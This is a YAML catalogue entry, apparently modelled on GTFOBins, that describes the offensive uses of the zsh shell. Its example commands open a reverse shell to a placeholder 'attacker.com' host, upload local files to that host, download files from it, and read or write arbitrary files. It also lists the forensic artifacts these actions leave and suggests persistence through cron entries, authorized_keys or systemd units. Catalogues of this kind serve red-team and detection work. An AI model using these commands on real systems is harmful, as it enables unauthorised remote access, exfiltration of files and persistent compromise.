---
name: zsh
capabilities:
- exec
- spawn
- read
- write
- upload
- download
- reverse-shell
required_permissions:
  level: user
difficulty: low
opsec:
  noise: high
  artifacts:
  - ~/.bash_history
  - Network connection logs / firewall logs
  - auditd execve events
  - Process arguments visible in ps and auditd
  - File timestamps / inotify events on target paths
  - Outbound network traffic to attacker host
  notes: ''
persistence_potential: true
examples:
- id: download
  description: Fetch a remote file to disk.
  capabilities:
  - download
  command: zsh -c 'zmodload zsh/net/tcp;ztcp attacker.com 12345;echo -n "$(<&$REPLY)" >/path/to/output-file'
- id: file-read
  description: Read an arbitrary file.
  capabilities:
  - read
  command: zsh -c 'echo "$(</path/to/input-file)"'
- id: file-read-2
  description: Read an arbitrary file.
  capabilities:
  - read
  command: zsh -c '</path/to/input-file'
  notes: This spawns a pager if run in a TTY.
- id: file-write
  description: Write content to an arbitrary file.
  capabilities:
  - write
  command: zsh -c 'echo DATA >/path/to/output-file'
- id: reverse-shell
  description: Initiate a reverse shell to attacker host.
  capabilities:
  - reverse-shell
  - exec
  command: zsh -c 'zmodload zsh/net/tcp;ztcp attacker.com 12345;zsh >&$REPLY 2>&$REPLY 0>&$REPLY'
- id: shell
  description: Spawn an interactive shell.
  capabilities:
  - spawn
  - exec
  command: zsh
- id: upload
  description: Send a local file to a remote host.
  capabilities:
  - upload
  command: zsh -c 'zmodload zsh/net/tcp;ztcp attacker.com 12345;echo -n "$(</path/to/input-file)" >&$REPLY'
references:
- https://gtfobins.github.io/gtfobins/zsh/
tags: []
persistence_notes: Combine with write/exec primitives to drop cron entries, authorized_keys, or systemd units.
---
